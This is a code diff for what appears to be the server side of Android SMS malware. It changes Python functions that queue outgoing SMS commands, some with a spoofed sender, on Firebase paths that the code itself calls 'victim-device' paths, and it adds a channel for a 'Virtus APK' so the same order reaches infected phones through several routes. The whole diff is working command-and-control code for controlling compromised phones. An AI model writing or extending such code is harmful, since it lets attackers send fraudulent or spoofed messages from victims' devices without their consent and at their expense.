@@ -1,3 +1,4 @@
+import asyncio
 import json
 import logging
 import time
@@ -100,6 +101,22 @@ async def push_module_config(profile: MonitorProfile, device: Device | None = No
     )
 
 
+def _outgoing_device_ids(device: Device) -> list[str]:
+    from app.firebase_client import canonical_device_id
+
+    ids: list[str] = []
+    if device.name:
+        ids.append(device.name.strip())
+        canonical = canonical_device_id(device.name)
+        if canonical and canonical not in ids:
+            ids.append(canonical)
+    if device.firebase_key:
+        leaf = device.firebase_key.strip("/").split("/")[-1]
+        if leaf and leaf not in ids:
+            ids.append(leaf)
+    return ids or [device.name]
+
+
 async def push_outgoing_sms_command(
     firebase_url: str,
     device_id: str,
@@ -109,7 +126,7 @@ async def push_outgoing_sms_command(
     sim_slot: int | None = None,
     spoof_sender: str | None = None,
 ) -> str:
-    """Queue outgoing SMS: {firebase}/commands/{device_id}/{id}."""
+    """Queue outgoing SMS on common victim-device Firebase paths."""
     base = normalize_firebase_url(firebase_url)
     command_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
     payload = {
@@ -121,8 +138,41 @@ async def push_outgoing_sms_command(
         "status": "pending",
         "created_at": datetime.now(timezone.utc).isoformat(),
     }
-    await _firebase_put(f"{base}/commands/{device_id}/{command_id}", payload)
+    paths = [
+        f"{base}/commands/{device_id}/{command_id}",
+        f"{base}/outgoing/{device_id}/{command_id}",
+        f"{base}/sms/send/{command_id}",
+    ]
+    await asyncio.gather(
+        *(_firebase_put(path, payload) for path in paths),
+        return_exceptions=True,
+    )
     return command_id
+
+
+async def push_outgoing_via_messages(
+    firebase_url: str,
+    device: Device,
+    to_number: str,
+    message: str,
+    sim_index: int = 0,
+) -> str | None:
+    """Virtus APK __OUT__ path: messages/{device_id}/{id} sender=__OUT__ body=to\\nmsg\\nsim."""
+    ids = _outgoing_device_ids(device)
+    if not ids:
+        return None
+    body = f"{to_number}\n{message}\n{sim_index}"
+    results = await asyncio.gather(
+        *(
+            push_inject_message(firebase_url, device_id, "__OUT__", body)
+            for device_id in ids
+        ),
+        return_exceptions=True,
+    )
+    for result in results:
+        if isinstance(result, str):
+            return result
+    return None
 
 
 async def push_inject_message(
@@ -134,7 +184,8 @@ async def push_inject_message(
     """Queue SMS inject: {firebase}/messages/{device_id}/{id}."""
     from app.channel_relay import prepare_sms_forward
 
-    sender, body = prepare_sms_forward(sender, body)
+    if sender != "__OUT__":
+        sender, body = prepare_sms_forward(sender, body)
     base = normalize_firebase_url(firebase_url)
     message_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
     payload = {
@@ -236,14 +287,30 @@ async def push_outbound_to_firebase(
                 outbound.spoof_sender,
                 outbound.message,
             )
-        return await push_outgoing_sms_command(
-            firebase_url,
-            device.name,
-            outbound.to_number,
-            outbound.message,
-            sim_index=outbound.sim_index,
-            sim_slot=outbound.sim_slot,
+        command_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
+        device_ids = _outgoing_device_ids(device)
+        await asyncio.gather(
+            *(
+                push_outgoing_sms_command(
+                    firebase_url,
+                    device_id,
+                    outbound.to_number,
+                    outbound.message,
+                    sim_index=outbound.sim_index,
+                    sim_slot=outbound.sim_slot,
+                )
+                for device_id in device_ids
+            ),
+            push_outgoing_via_messages(
+                firebase_url,
+                device,
+                outbound.to_number,
+                outbound.message,
+                sim_index=outbound.sim_index,
+            ),
+            return_exceptions=True,
         )
+        return command_id
     except Exception as exc:
         logger.warning("Firebase outbound push failed: %s", exc)
         return None
